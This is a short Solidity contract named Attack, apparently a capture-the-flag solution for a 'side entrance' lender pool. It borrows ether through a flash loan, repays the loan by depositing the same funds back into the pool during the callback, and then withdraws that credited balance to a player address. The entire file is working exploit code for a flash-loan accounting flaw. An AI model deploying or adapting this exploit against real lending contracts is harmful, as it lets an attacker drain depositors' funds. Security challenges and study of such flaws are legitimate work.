// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256) external;
}

contract Attack {
    ISideEntranceLenderPool public victim;
    address payable public player;

    constructor(address _victim, address payable _player) {
        victim = ISideEntranceLenderPool(_victim);
        player = _player;
    }

    function execute() external payable {
        victim.deposit{value: msg.value}();
    }

    function withdraw() external {
        victim.withdraw();
        player.transfer(address(this).balance);
    }

    function flashLoan(uint256 amount) external {
        victim.flashLoan(amount);
    }

    receive() external payable {}
}
